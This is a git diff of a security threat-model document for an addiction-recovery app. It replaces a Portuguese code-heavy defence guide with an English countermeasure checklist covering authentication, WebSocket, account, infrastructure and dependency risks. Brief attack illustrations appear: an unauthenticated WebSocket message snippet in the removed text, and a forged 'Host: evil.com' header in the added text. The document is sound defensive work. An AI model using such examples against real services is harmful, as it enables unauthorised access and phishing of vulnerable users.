-    sendEmailVerification(request.new_email, verificationToken)
-    
-    # Salva token temporariamente
-    database.savePendingEmailChange(currentUserId, request.new_email, verificationToken)
-    
-    return {"message": "Email de verificação enviado"}
-
-
-# MEDIDA 6: Auditoria de mudanças sensíveis
-class AuditLog:
-    @staticmethod
-    def logSensitiveChange(userId: str, field: str, oldValue: str, newValue: str):
-        database.saveAuditLog({
-            'user_id': userId,
-            'action': 'field_change',
-            'field': field,
-            'old_value': oldValue if field != 'password' else '***',
-            'new_value': newValue if field != 'password' else '***',
-            'timestamp': datetime.utcnow(),
-            'ip_address': get_current_ip()
-        })
-
-
-@router.put("/users/password")
-async def changePassword(
-    oldPassword: str,
-    newPassword: str,
-    currentUserId: str = Depends(getCurrentUser)
-):
-    """Mudança de senha com auditoria"""
-    user = database.getUserById(currentUserId)
-    
-    # Verificar senha antiga
-    if not bcrypt.checkpw(oldPassword.encode(), user.password_hash.encode()):
-        # MEDIDA 7: Log de tentativa falha
-        AuditLog.logSensitiveChange(currentUserId, 'password', 'N/A', 'FAILED_ATTEMPT')
-        raise HTTPException(status_code=401, detail="Senha incorreta")
-    
-    # MEDIDA 8: Validar força da nova senha
-    if len(newPassword) < 8:
-        raise HTTPException(status_code=400, detail="Senha muito curta")
-    
-    # Hash nova senha
-    newHash = bcrypt.hashpw(newPassword.encode(), bcrypt.gensalt(rounds=12))
-    
-    # Atualizar
-    database.updateUserPassword(currentUserId, newHash.decode())
-    
-    # MEDIDA 9: Revogar todos tokens existentes
-    database.revokeAllRefreshTokens(currentUserId)
-    
-    # Log de sucesso
-    AuditLog.logSensitiveChange(currentUserId, 'password', '***', 'CHANGED')
-    
-    return {"message": "Senha alterada com sucesso. Faça login novamente."}
-```
+**Pending countermeasures:**
+- [ ] Ownership checks in all `Service` methods — verify that the authenticated user owns the requested resource before returning or modifying it
 
 ---
 
-## 6. Ataques de WebSocket
+## 6. WebSocket Attacks
 
-### 6.1 WebSocket Hijacking
+### 6.1 WebSocket Hijacking / Unauthenticated Connections
 
-**O que é:**
-Atacante intercepta ou injeta mensagens WebSocket.
+**What it is:** An attacker connects to the WebSocket endpoint without a valid token.
 
-**Como acontece:**
-```javascript
-// Atacante cria WebSocket sem autenticação
-const ws = new WebSocket('wss://noharm.app/socket');
-
-ws.onopen = () => {
-  // Tenta enviar mensagem
-  ws.send(JSON.stringify({
-    type: 'message',
-    recipient: 'user123',
-    content: 'Mensagem maliciosa'
-  }));
-};
-```
-
-**Prevenção:**
-
-```python
-# backend/websocket/socketManager.py
-import socketio
-from typing import Dict, Set, Optional
-from datetime import datetime, timedelta
-
-class SocketManager:
-    def __init__(self, jwtHandler: JwtHandler):
-        self.sio = socketio.AsyncServer(
-            async_mode='asgi',
-            cors_allowed_origins=[
-                'https://noharm.app',
-                'https://www.noharm.app'
-            ],  # MEDIDA 1: Whitelist de origens
-            ping_timeout=60,
-            ping_interval=25,
-            max_http_buffer_size=102400,  # MEDIDA 2: 100KB máximo
-            logger=True,
-            engineio_logger=True
-        )
-        
-        self.jwtHandler = jwtHandler
-        self.connectedUsers: Dict[str, Set[str]] = {}  # userId -> {sid1, sid2}
-        self.sidToUser: Dict[str, str] = {}             # sid -> userId
-        self.messageRateLimits: Dict[str, list] = {}    # userId -> [timestamps]
-        
-        self.setupHandlers()
-    
-    def setupHandlers(self):
-        """Configura event handlers"""
-        
-        @self.sio.event
-        async def connect(sid, environ):
-            """
-            MEDIDA 3: Autenticação obrigatória na conexão
-            """
-            try:
-                userId = await self.authenticate(sid, environ)
-                
-                if not userId:
-                    print(f"⚠️ Conexão rejeitada: autenticação falhou")
-                    return False  # Rejeita conexão
-                
-                # MEDIDA 4: Registra conexão
-                await self.registerConnection(userId, sid, environ)
-                
-                print(f"✅ Conexão estabelecida: {userId}")
-                return True
-                
-            except Exception as e:
-                print(f"🚨 Erro na conexão: {str(e)}")
-                return False
-        
-        @self.sio.event
-        async def disconnect(sid):
-            """Limpa conexão"""
-            if sid in self.sidToUser:
-                userId = self.sidToUser[sid]
-                await self.unregisterConnection(userId, sid)
-                print(f"👋 Desconectado: {userId}")
-        
-        @self.sio.event
-        async def message(sid, data):
-            """
-            MEDIDA 5: Validação de mensagens
-            """
-            try:
-                # Verifica se está autenticado
-                if sid not in self.sidToUser:
-                    await self.sio.emit('error', {
-                        'message': 'Não autenticado'
-                    }, room=sid)
-                    return
-                
-                userId = self.sidToUser[sid]
-                
-                # MEDIDA 6: Rate limiting por usuário
-                if not await self.checkMessageRateLimit(userId):
-                    await self.sio.emit('error', {
-                        'message': 'Muitas mensagens. Aguarde um momento.'
-                    }, room=sid)
-                    return
-                
-                # MEDIDA 7: Validação de dados
-                validated = self.validateMessage(data)
-                
-                # MEDIDA 8: Sanitização
-                sanitized = self.sanitizeMessage(validated)
-                
-                # MEDIDA 9: Verificar que destinatário existe
-                if not database.userExists(sanitized['recipient_id']):
-                    await self.sio.emit('error', {
-                        'message': 'Destinatário não encontrado'
-                    }, room=sid)
-                    return
-                
-                # Processar mensagem
-                await self.handleMessage(userId, sanitized)
-                
-            except ValueError as e:
-                await self.sio.emit('error', {
-                    'message': str(e)
-                }, room=sid)
-            except Exception as e:
-                print(f"🚨 Erro ao processar mensagem: {str(e)}")
-                await self.sio.emit('error', {
-                    'message': 'Erro ao processar mensagem'
-                }, room=sid)
-    
-    async def authenticate(self, sid: str, environ: dict) -> Optional[str]:
-        """
-        Autentica conexão WebSocket
-        """
-        try:
-            # MEDIDA 10: Extrai token JWT
-            token = self.extractToken(environ)
-            
-            if not token:
-                return None
-            
-            # Verifica token
-            payload = self.jwtHandler.verifyToken(token, 'access')
-            
-            if not payload:
-                return None
-            
-            userId = payload['sub']
-            
-            # MEDIDA 11: Verifica IP blacklist
-            clientIp = self.getClientIp(environ)
-            if await self.isIpBlacklisted(clientIp):
-                print(f"🚨 IP bloqueado tentou conectar: {clientIp}")
-                return None
-            
-            return userId
-            
-        except Exception as e:
-            print(f"Erro na autenticação WebSocket: {e}")
-            return None
-    
-    def extractToken(self, environ: dict) -> Optional[str]:
-        """Extrai JWT da conexão"""
-        # Tenta do header Authorization
-        auth = environ.get('HTTP_AUTHORIZATION', '')
-        if auth.startswith('Bearer '):
-            return auth[7:]
-        
-        # Tenta da query string
-        query = environ.get('QUERY_STRING', '')
-        if 'token=' in query:
-            for param in query.split('&'):
-                if param.startswith('token='):
-                    return param[6:]
-        
-        return None
-    
-    def getClientIp(self, environ: dict) -> str:
-        """Obtém IP real do cliente"""
-        # MEDIDA 12: Suporta proxies
-        forwarded = environ.get('HTTP_X_FORWARDED_FOR')
-        if forwarded:
-            return forwarded.split(',')[0].strip()
-        
-        real_ip = environ.get('HTTP_X_REAL_IP')
-        if real_ip:
-            return real_ip
-        
-        return environ.get('REMOTE_ADDR', 'unknown')
-    
-    async def registerConnection(self, userId: str, sid: str, environ: dict):
-        """Registra conexão"""
-        # MEDIDA 13: Limita conexões simultâneas
-        if userId not in self.connectedUsers:
-            self.connectedUsers[userId] = set()
-        
-        # Máximo 5 dispositivos
-        if len(self.connectedUsers[userId]) >= 5:
-            # Desconecta o mais antigo
-            oldest = list(self.connectedUsers[userId])[0]
-            await self.sio.disconnect(oldest)
-            self.connectedUsers[userId].remove(oldest)
-            if oldest in self.sidToUser:
-                del self.sidToUser[oldest]
-        
-        # Adiciona nova conexão
-        self.connectedUsers[userId].add(sid)
-        self.sidToUser[sid] = userId
-        
-        # Log de conexão
-        clientIp = self.getClientIp(environ)
-        userAgent = environ.get('HTTP_USER_AGENT', '')
-        
-        print(f"📱 Nova conexão: {userId} | IP: {clientIp} | UA: {userAgent[:50]}")
-    
-    async def unregisterConnection(self, userId: str, sid: str):
-        """Remove conexão"""
-        if userId in self.connectedUsers:
-            self.connectedUsers[userId].discard(sid)
-            
-            if not self.connectedUsers[userId]:
-                del self.connectedUsers[userId]
-        
-        if sid in self.sidToUser:
-            del self.sidToUser[sid]
-    
-    async def checkMessageRateLimit(self, userId: str) -> bool:
-        """
-        MEDIDA 14: Rate limiting de mensagens
-        """
-        now = datetime.utcnow()
-        
-        if userId not in self.messageRateLimits:
-            self.messageRateLimits[userId] = []
-        
-        # Remove mensagens antigas (> 1 minuto)
-        cutoff = now - timedelta(minutes=1)
-        self.messageRateLimits[userId] = [
-            ts for ts in self.messageRateLimits[userId]
-            if ts > cutoff
-        ]
-        
-        # Limita a 20 mensagens por minuto
-        if len(self.messageRateLimits[userId]) >= 20:
-            return False
-        
-        self.messageRateLimits[userId].append(now)
-        return True
-    
-    def validateMessage(self, data: dict) -> dict:
-        """
-        MEDIDA 15: Validação rigorosa
-        """
-        if not isinstance(data, dict):
-            raise ValueError("Mensagem deve ser objeto")
-        
-        # Campos obrigatórios
-        required = ['type', 'content']
-        for field in required:
-            if field not in data:
-                raise ValueError(f"Campo obrigatório: {field}")
-        
-        # Valida tipo
-        allowedTypes = ['chat_message', 'typing', 'read_receipt']
-        if data['type'] not in allowedTypes:
-            raise ValueError(f"Tipo inválido: {data['type']}")
-        
-        return data
-    
-    def sanitizeMessage(self, data: dict) -> dict:
-        """
-        MEDIDA 16: Sanitização
-        """
-        from security.sanitizer import InputSanitizer
-        sanitizer = InputSanitizer()
-        
-        return {
-            'type': data['type'],
-            'content': sanitizer.sanitizeHtml(str(data.get('content', ''))),
-            'recipient_id': sanitizer.sanitizeId(str(data.get('recipient_id', '')))
-        }
-    
-    async def handleMessage(self, senderId: str, message: dict):
-        """Processa e envia mensagem"""
-        recipientId = message['recipient_id']
-        
-        # Salva no banco
-        messageId = database.saveMessage({
-            'sender_id': senderId,
-            'recipient_id': recipientId,
-            'content': message['content'],
-            'type': message['type'],
-            'created_at': datetime.utcnow()
-        })
-        
-        # MEDIDA 17: Envia apenas para destinatário
-        if recipientId in self.connectedUsers:
-            # Emite para todas sessões do destinatário
-            for sid in self.connectedUsers[recipientId]:
-                await self.sio.emit('new_message', {
-                    'id': messageId,
-                    'sender_id': senderId,
-                    'content': message['content'],
-                    'created_at': datetime.utcnow().isoformat()
-                }, room=sid)
-    
-    async def isIpBlacklisted(self, ip: str) -> bool:
-        """Verifica se IP está bloqueado"""
-        # TODO: Implementar com Redis
-        return False
-```
-
-**Configuração do cliente:**
-
-```javascript
-// frontend/socket.js
-
-class SecureSocketClient {
-  constructor() {
-    this.socket = null;
-    this.reconnectAttempts = 0;
-    this.maxReconnectAttempts = 5;
-  }
-  
-  connect(token) {
-    // MEDIDA 18: Sempre usar WSS (WebSocket Secure)
-    const wsUrl = 'wss://noharm.app/socket';
-    
-    this.socket = io(wsUrl, {
-      auth: {
-        token: token  // JWT token
-      },
-      transports: ['websocket'],  // Apenas WebSocket (não polling)
-      reconnection: true,
-      reconnectionAttempts: this.maxReconnectAttempts,
-      reconnectionDelay: 1000,
-      timeout: 20000
-    });
-    
-    this.setupHandlers();
-  }
-  
-  setupHandlers() {
-    this.socket.on('connect', () => {
-      console.log('✅ Conectado ao WebSocket');
-      this.reconnectAttempts = 0;
-    });
-    
-    this.socket.on('disconnect', (reason) => {
-      console.log('⚠️ Desconectado:', reason);
-      
-      // MEDIDA 19: Não reconectar automaticamente se token expirou
-      if (reason === 'io server disconnect') {
-        // Servidor forçou desconexão (provável token inválido)
-        // Não tentar reconectar
-        this.socket.disconnect();
-      }
-    });
-    
-    this.socket.on('error', (error) => {
-      console.error('🚨 Erro WebSocket:', error);
-    });
-    
-    this.socket.on('new_message', (message) => {
-      // MEDIDA 20: Validar mensagens recebidas
-      if (this.isValidMessage(message)) {
-        this.handleNewMessage(message);
-      }
-    });
-  }
-  
-  isValidMessage(message) {
-    // MEDIDA 21: Validação client-side (defesa em profundidade)
-    return (
-      message &&
-      typeof message === 'object' &&
-      typeof message.id === 'string' &&
-      typeof message.content === 'string' &&
-      message.content.length <= 2000
-    );
-  }
-  
-  sendMessage(recipientId, content) {
-    // MEDIDA 22: Validação antes de enviar
-    if (!recipientId || !content) {
-      throw new Error('Dados inválidos');
-    }
-    
-    if (content.length > 2000) {
-      throw new Error('Mensagem muito longa');
-    }
-    
-    this.socket.emit('message', {
-      type: 'chat_message',
-      recipient_id: recipientId,
-      content: content
-    });
-  }
-  
-  disconnect() {
-    if (this.socket) {
-      this.socket.disconnect();
-    }
-  }
-}
-```
+**Countermeasures planned (`src/websocket/socketManager.py`):**
+- [ ] Mandatory JWT authentication on every `connect` event — reject connection if token is missing or invalid
+- [ ] Rate limiting on message events (max 20 messages / minute per user)
+- [ ] Strict payload validation — reject messages with unexpected fields or oversized content
+- [ ] Maximum 5 simultaneous connections per user — evict oldest on overflow
+- [ ] CORS origin whitelist on the Socket.IO server
 
 ---
 
-## 7. Configuração Completa
+## 7. Account & Identity Attacks
 
-### 7.1 Estrutura do Projeto
+### 7.1 Account Enumeration
 
-```
-backend/
-├── main.py                 # Aplicação principal
-├── config.py               # Configurações
-├── requirements.txt        # Dependências
-│
-├── security/
-│   ├── jwtHandler.py
-│   ├── rateLimiter.py
-│   ├── sanitizer.py
-│   ├── encryption.py
-│   └── middleware.py
-│
-├── database/
-│   ├── models.py
-│   ├── userRepository.py
-│   └── messageRepository.py
-│
-├── routes/
-│   ├── auth.py
-│   ├── users.py
-│   └── messages.py
-│
-└── websocket/
-    └── socketManager.py
-```
+**What it is:** An attacker probes the API to discover which email addresses are registered, building a list for targeted attacks (phishing, credential stuffing).
 
-### 7.2 Arquivo Principal
+**How it happens:**
+- `POST /auth/login` returns `"User not found"` for unknown emails and `"Invalid password"` for known ones — the attacker can tell the difference
+- `POST /auth/register` returns a conflict error for duplicate emails — confirming the email is taken
+- Forgot-password flows that confirm whether the email exists
+
+**Why this matters for NoHarm:** Users are in addiction recovery. Confirming their presence on the platform to a third party is a privacy violation with real personal-safety implications.
+
+**Pending countermeasures:**
+- [ ] Unified error message for login: `"Invalid credentials"` regardless of whether the email exists or the password is wrong — both cases must return the same response body, status code, and response time
+- [ ] Registration endpoint: return the same success-like response whether the email is new or already taken; send a `"you already have an account"` email to the existing address instead of leaking the conflict in the HTTP response
+- [ ] Forgot-password endpoint (when built): always respond with `"If this email is registered, you will receive a reset link"` — never confirm or deny
+
+**Where to implement:** `authRoutes.py`, `userService.py`
+
+---
+
+### 7.2 Missing Email Verification
+
+**What it is:** Users register with any email address without proving they own it. This allows registering with someone else's email, polluting the account, and blocking the real owner from registering.
+
+**Pending countermeasures:**
+- [ ] On registration, set `user.status = STATUS_CODES["pending"]` and send a verification email with a signed, time-limited token
+- [ ] Block access to protected endpoints until `user.status == STATUS_CODES["enabled"]`
+- [ ] Verification token: sign with HMAC-SHA256 using `JWT_SECRET_KEY`, include `userId` + `exp` (24h), store hash in database to allow single-use
+- [ ] Resend endpoint with its own rate limit (max 3 resends per hour per email)
+
+**Where to implement:** `userService.py`, `authRoutes.py`, `emailService.py`
+
+---
+
+### 7.3 Missing Secure Password Reset
+
+**What it is:** There is no password reset flow. A user who forgets their password has no way to recover their account.
+
+**Attack surface if implemented insecurely:**
+- Predictable reset tokens (sequential IDs, short numeric codes)
+- Tokens that never expire
+- Tokens that are reusable after first use
+- Reset links sent over HTTP
+
+**Pending countermeasures:**
+- [ ] Generate a `secrets.token_urlsafe(32)` reset token, store its SHA-256 hash in the database with a 1-hour expiry
+- [ ] Send only the plaintext token in the email — never store plaintext
+- [ ] On reset: verify token hash, check expiry, delete token immediately (single-use), invalidate all existing access and refresh tokens for the user, then update the password hash
+- [ ] Apply the same rate limit as login (max 3 reset requests per hour per IP and per email)
+
+**Where to implement:** `userService.py`, `authRoutes.py`, `emailService.py`
+
+---
+
+### 7.4 Missing Refresh Token Persistence
+
+**What it is:** Refresh tokens are issued but not stored in the database. This means:
+- There is no way to invalidate all sessions for a user (e.g. on password change or account compromise)
+- A stolen refresh token cannot be detected via reuse — if an attacker and the real user both hold valid refresh tokens, both will keep getting new access tokens indefinitely
+
+**Pending countermeasures:**
+- [ ] Store a SHA-256 hash of each refresh token in a `refreshTokens` table with `userId`, `hashedToken`, `expiresAt`, `createdAt`, `deviceHint`
+- [ ] On `POST /auth/refresh`: look up the hash, verify it exists and is not expired, delete it (rotation), issue a new pair
+- [ ] On password change or suspicious activity: delete all rows for `userId` — this logs out all devices
+- [ ] On logout: delete only the specific row — this logs out one device without affecting others
+
+**Where to implement:** new `refreshTokenRepository.py`, `userService.py`, `authRoutes.py`
+
+---
+
+### 7.5 Missing Audit Log Integration
+
+**What it is:** The `AuditLogsModel` and `AuditLogsRepository` are fully built but never called from any service or route. Security-sensitive actions leave no trace.
+
+**Actions that must be audited:**
+- Successful and failed login attempts (with IP)
+- Password change
+- Email change
+- Account status changes (blocked, banned)
+- Token revocation
+- Streak reset
+- Any admin-level action
+
+**Pending countermeasures:**
+- [ ] Create an `AuditService` that wraps `AuditLogsRepository` and exposes a single `log(type, catalystId, description)` method
+- [ ] Call `auditService.log()` from every service method that performs a sensitive action
+- [ ] Define a `LOG_TYPES` enum (e.g. `LOGIN_SUCCESS=1`, `LOGIN_FAILURE=2`, `PASSWORD_CHANGE=3`, ...) and document it in `STATUS_CODES` style in `.secrets.toml`
+- [ ] Ensure audit log entries are **never deleted** (append-only) and that the `description` field is encrypted (already supported by `AuditLogsModel`)
+
+**Where to implement:** new `auditService.py`, all `*Service.py` files
+
+---
+
+## 8. Infrastructure & Configuration Risks
+
+### 8.1 Information Leakage via Error Messages
+
+**What it is:** Internal implementation details (file paths, line numbers, class names) leak to API clients through error responses.
+
+**Current issue in `src/infrastructure/database/repositories/*.py`:**
 
 ```python
-# backend/main.py
-from fastapi import FastAPI
-from fastapi.middleware.cors import CORSMiddleware
-import socketio
-
-# Imports locais
-from security.middleware import SecurityHeadersMiddleware, RateLimitMiddleware, CsrfMiddleware
-from security.jwtHandler import JwtHandler
-from websocket.socketManager import SocketManager
-from routes import auth, users, messages
-from config import settings
-
-# Criar aplicação FastAPI
-app = FastAPI(
-    title="NoHarm API",
-    description="API segura para aplicativo de recuperação",
-    version="1.0.0"
+# This is the current pattern in every repository's except block:
+raise NoHarmException(
+    status_code=500,
+    message=f'{type(e).__name__}: {e} in line {sys.exc_info()[-1].tb_lineno} '
+            f'in file {sys.exc_info()[-1].tb_frame.f_code.co_filename}'
 )
-
-# MEDIDA 1: CORS configurado corretamente
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=settings.ALLOWED_ORIGINS,  # Apenas domínios confiáveis
-    allow_credentials=True,
-    allow_methods=["GET", "POST", "PUT", "DELETE"],
-    allow_headers=["*"],
-    max_age=3600
-)
-
-# MEDIDA 2: Security headers
-app.add_middleware(SecurityHeadersMiddleware)
-
-# MEDIDA 3: Rate limiting
-app.add_middleware(RateLimitMiddleware)
-
-# MEDIDA 4: CSRF protection
-app.add_middleware(CsrfMiddleware)
-
-# Configurar WebSocket
-jwtHandler = JwtHandler()
-socketManager = SocketManager(jwtHandler)
-
-# Criar aplicação Socket.IO
-sio_app = socketio.ASGIApp(
-    socketManager.sio,
-    app,
-    socketio_path='/socket'
-)
-
-# Registrar rotas
-app.include_router(auth.router, prefix="/api/auth", tags=["Authentication"])
-app.include_router(users.router, prefix="/api/users", tags=["Users"])
-app.include_router(messages.router, prefix="/api/messages", tags=["Messages"])
-
-# Health check
-@app.get("/health")
-async def healthCheck():
-    return {"status": "healthy"}
-
-# Executar
-if __name__ == "__main__":
-    import uvicorn
-    uvicorn.run(
-        sio_app,
-        host="0.0.0.0",
-        port=8000,
-        ssl_keyfile="/path/to/privkey.pem",   # HTTPS obrigatório
-        ssl_certfile="/path/to/fullchain.pem",
-        timeout_keep_alive=5,
-        limit_concurrency=1000
-    )
 ```
 
-### 7.3 Configurações
+This exposes the server's file system layout and internal class names to any client that triggers a 500 error — extremely useful to an attacker performing reconnaissance.
+
+**Pending countermeasures:**
+- [ ] Log the full traceback server-side (to a structured logger or Sentry) but return a generic message to the client: `"An internal error occurred"` with only the `errorCode`
+- [ ] Introduce a logging wrapper that captures `exc_info=True` and strips all sensitive detail from the client response
+- [ ] In `main.py`, add a catch-all exception handler for unhandled `Exception` (not just `NoHarmException`) that prevents FastAPI's default detail from leaking
 
 ```python
-# backend/config.py
-from pydantic import BaseSettings
-from typing import List
-import secrets
-
-class Settings(BaseSettings):
-    # MEDIDA 5: Variáveis de ambiente para secrets
-    JWT_SECRET_KEY: str = secrets.token_urlsafe(32)
-    JWT_REFRESH_SECRET_KEY: str = secrets.token_urlsafe(32)
-    ENCRYPTION_MASTER_KEY: str = secrets.token_urlsafe(32)
-    ENCRYPTION_SALT: str = secrets.token_urlsafe(16)
-    
-    # Database
-    DATABASE_URL: str = "postgresql://user:pass@localhost/noharm"
-    REDIS_URL: str = "redis://localhost:6379"
-    
-    # CORS
-    ALLOWED_ORIGINS: List[str] = [
-        "https://noharm.app",
-        "https://www.noharm.app"
-    ]
-    
-    # Rate Limiting
-    MAX_REQUESTS_PER_MINUTE: int = 60
-    MAX_WEBSOCKET_CONNECTIONS: int = 5
-    
-    # Security
-    BCRYPT_ROUNDS: int = 12
-    ACCESS_TOKEN_EXPIRE_MINUTES: int = 15
-    REFRESH_TOKEN_EXPIRE_DAYS: int = 7
-    
-    class Config:
-        env_file = ".env"
-
-settings = Settings()
+@app.exception_handler(Exception)
+async def unhandledExceptionHandler(request: Request, exc: Exception):
+    logger.error("Unhandled exception", exc_info=True)
+    return JSONResponse(status_code=500, content={"errorCode": "INTERNAL_ERROR", "message": "An internal error occurred"})
 ```
 
-### 7.4 Requirements.txt
-
-```txt
-# backend/requirements.txt
-
-# Framework
-fastapi==0.104.1
-uvicorn[standard]==0.24.0
-python-socketio==5.10.0
-python-multipart==0.0.6
-
-# Security
-python-jose[cryptography]==3.3.0
-passlib[bcrypt]==1.7.4
-bcrypt==4.1.1
-cryptography==41.0.7
-pydantic[email]==2.5.0
-
-# Database
-sqlalchemy==2.0.23
-psycopg2-binary==2.9.9
-redis==5.0.1
-
-# Validation & Sanitization
-bleach==6.1.0
-email-validator==2.1.0
-
-# Monitoring
-python-json-logger==2.0.7
-
-# Testing
-pytest==7.4.3
-pytest-asyncio==0.21.1
-httpx==0.25.2
-```
+**Where to implement:** all `*Repository.py` files, `main.py`
 
 ---
 
-## Resumo de Proteções por Tipo de Ataque
+### 8.2 Rate Limit State Loss on Restart
 
-| Ataque | Medidas de Proteção | Implementação |
-|--------|---------------------|---------------|
-| **JWT Theft** | Tokens curtos (15min), blacklist, JTI único, regeneração | `jwtHandler.py` |
-| **Brute Force** | Rate limiting por IP/usuário, lockout progressivo, CAPTCHA | `rateLimiter.py` |
-| **SQL Injection** | ORM (SQLAlchemy), parametrização, validação | `userRepository.py` |
-| **NoSQL Injection** | Validação de tipos, sanitização de $, whitelist | `mongoRepository.py` |
-| **XSS** | Sanitização HTML, CSP headers, validação | `sanitizer.py` |
-| **CSRF** | CSRF tokens, SameSite cookies, validação de origem | `csrfProtection.py` |
-| **Session Fixation** | Regeneração de session ID, validação de IP/UA | `sessionManager.py` |
-| **DoS/DDoS** | Rate limiting multicamadas, timeouts, burst protection | `advancedRateLimiter.py` |
-| **Slowloris** | Timeouts curtos, limites de conexão, Nginx | `main.py`, nginx.conf |
-| **Data Exposure** | DTOs (Pydantic), sanitização de logs, response_model | `userModel.py` |
-| **Mass Assignment** | Whitelist de campos, validação Pydantic, auditoria | `userRoutes.py` |
-| **WebSocket Hijacking** | Autenticação JWT, rate limiting, validação | `socketManager.py` |
+**What it is:** All rate limiter state (`IpRateLimiter`, `LoginRateLimiter`) lives in Python dictionaries in memory. A server restart, worker crash, or deployment resets every IP block and login lockout instantly.
+
+**Attack scenario:** An attacker performs 4 failed login attempts, waits for a deploy (common on Vercel's serverless model), then continues — the lockout counter resets to 0.
+
+**Pending countermeasures:**
+- [ ] Persist rate limiter state to Redis with TTL-based keys (replaces in-memory dicts)
+- [ ] On Vercel serverless: consider rate limiting at the edge (Vercel's built-in rate limiting or Upstash Redis)
+- [ ] Alternatively, use a stateless approach: store a short-lived signed token in the response that encodes the attempt count — the client must echo it on the next request (works without shared state)
+
+**Where to implement:** `rateLimiter.py`, infrastructure config
 
 ---
 
-**Próximos passos:**
-1. Implementar Redis para blacklist de tokens
-2. Configurar monitoramento (Sentry, Datadog)
-3. Testes de penetração
-4. Auditoria de segurança
+### 8.3 Missing Request Body Size Limit
 
-Quer que eu detalhe alguma seção específica?
+**What it is:** Without a maximum body size, an attacker can send a gigabyte-sized JSON payload to any endpoint, causing memory exhaustion or a slow-upload DoS.
+
+**Pending countermeasures:**
+- [ ] Set `app = FastAPI(...)` with no built-in limit, but configure Uvicorn: `--limit-request-body-size 1048576` (1 MB)
+- [ ] Nginx: `client_max_body_size 1m`
+- [ ] For file upload endpoints (profile picture): validate content type and enforce a stricter limit (e.g. 5 MB) at the route level using `UploadFile` with explicit size checks
+
+**Where to implement:** `run.py` (Uvicorn config), Nginx config
+
+---
+
+### 8.4 Encryption Key Compromise & Rotation
+
+**What it is:** A single `ENCRYPTION_KEY` is used to encrypt every sensitive field across all tables. If this key is ever exposed (leaked secret, compromised environment), an attacker with a database dump can decrypt everything — all usernames, emails, and messages retroactively.
+
+**Current risk:** The key is stored in `.secrets.toml` alongside the database password. A single secret file compromise exposes both.
+
+**Pending countermeasures:**
+- [ ] Key versioning: prefix encrypted values with a key version identifier (e.g. `v1:...`). When rotating, re-encrypt rows in batches using the new key while old ones are still decryptable with the old key
+- [ ] Separate the encryption key from the database credentials — store them in different secret sources or use a secrets manager (e.g. Google Secret Manager, AWS Secrets Manager, Doppler)
+- [ ] Derive per-table or per-column subkeys from the master key using HKDF — limits blast radius if one subkey is compromised
+- [ ] Define a key rotation runbook: how to re-encrypt all rows with a new key without downtime
+
+**Where to implement:** `encryption.py`, `config.py`, infrastructure
+
+---
+
+### 8.5 Debug Mode & Stack Traces in Production
+
+**What it is:** `DEBUG = false` is set in `staging` and `production` in `.secrets.toml`, but `main.py` passes `debug=config.DEBUG` directly to FastAPI. If `DEBUG` is ever accidentally set to `true` in production, FastAPI will return full Python tracebacks in HTTP responses.
+
+**Pending countermeasures:**
+- [ ] Add a startup guard that raises a hard error if `DEBUG=true` and `EXEC_MODE` is `"prod"` or `"staging"`
+- [ ] Regardless of `DEBUG`, always use the custom `noHarmExceptionHandler` and the catch-all handler (see §8.1) to prevent tracebacks from reaching clients
+
+```python
+# In main.py or config.py startup
+if config.DEBUG and config.EXEC_MODE in ("prod", "staging"):
+    raise RuntimeError("DEBUG must be false in non-development environments")
+```
+
+**Where to implement:** `main.py`, `config.py`
+
+---
+
+### 8.6 Host Header Injection
+
+**What it is:** An attacker sends a forged `Host` header (e.g. `Host: evil.com`). If the application uses `request.base_url` or `request.headers["host"]` to build URLs (e.g. in password reset emails), the generated link points to the attacker's domain.
+
+**Pending countermeasures:**
+- [ ] Never build absolute URLs from `request.headers["host"]` — always use a hardcoded `BASE_URL` config value
+- [ ] Add `BASE_URL` to the `.secrets.toml` config and validate it on startup
+- [ ] Nginx: use `if ($host !~* "^noharm\.app$") { return 444; }` to reject requests with unexpected Host headers before they reach the app
+
+**Where to implement:** `config.py`, `emailService.py`, Nginx config
+
+---
+
+### 8.7 File Upload Security (Planned Feature)
+
+**What it is:** The storage service is planned but not yet built. File uploads are a common attack surface: malicious file types, oversized files, path traversal, and malware distribution.
+
+**Pending countermeasures (to be implemented before launch):**
+- [ ] Validate MIME type by reading the file's magic bytes — never trust the `Content-Type` header or the file extension alone
+- [ ] Restrict accepted types to a whitelist: `image/jpeg`, `image/png`, `image/webp`
+- [ ] Enforce a maximum file size (e.g. 5 MB) at the route level, before uploading to GCS
+- [ ] Rename uploaded files to a UUID — never use the original filename
+- [ ] Store files in a private GCS bucket; serve them via a signed URL with a short TTL rather than a public URL
+- [ ] Do not serve uploaded files from the same domain as the API — use a separate origin or CDN to prevent MIME-type sniffing attacks
+
+**Where to implement:** `storageService.py`, `userRoutes.py`
+
+---
+
+## 9. Supply Chain & Dependency Risks
+
+### 9.1 Outdated or Vulnerable Dependencies
+
+**What it is:** A vulnerability in a third-party package (e.g. a CVE in `cryptography`, `PyJWT`, or `FastAPI`) can compromise the entire application, regardless of how well the application code is written.
+
+**Current state:** Dependencies are pinned to specific versions in `requirements.txt`, which prevents unexpected breaking changes, but also means security patches are not applied automatically.
+
+**Pending countermeasures:**
+- [ ] Add `pip-audit` or `safety` to the CI pipeline — fail the build if any dependency has a known CVE
+
+```bash
+# Add to GitHub Actions
+pip install pip-audit
+pip-audit -r requirements.txt
+```
+
+- [ ] Enable GitHub's Dependabot for automated dependency update PRs
+- [ ] Review and update pinned versions at least monthly; prioritise security releases immediately
+- [ ] Add a `requirements-dev.txt` for test/dev-only packages to reduce the production attack surface
+
+**Where to implement:** `.github/workflows/`, `requirements.txt`
+
+---
+
+### 9.2 Secrets in Version Control
+
+**What it is:** `.secrets.toml` contains the database password, encryption key, and JWT secrets. If this file is ever committed to Git (even once, even on a private repository), the secrets are permanently compromised — Git history retains all commits.
+
+**Current state:** `.gitignore` includes `venv` and `__pycache__` but **does not explicitly ignore `.secrets.toml`**.
+
+**Pending countermeasures:**
+- [ ] **Immediately** add `.secrets.toml` and `.env*.local` to `.gitignore`
+- [ ] Run `git log --all -- .secrets.toml` and `git log --all -- .env.local` to verify these files have never been committed
+- [ ] If they have been committed, rotate all secrets immediately — assume they are compromised
+- [ ] Add a pre-commit hook (e.g. `detect-secrets` or `git-secrets`) that blocks commits containing high-entropy strings or known secret patterns
+- [ ] Consider using Vercel's encrypted environment variable storage instead of `.secrets.toml` for production deployments
+
+**Where to implement:** `.gitignore`, CI pre-commit hooks
+
+---
+
+## 10. Implementation Status
+
+### Implemented ✅
+
+| Layer | Control |
+|-------|---------|
+| Transport | Security headers (CSP, HSTS, X-Frame-Options, etc.) |
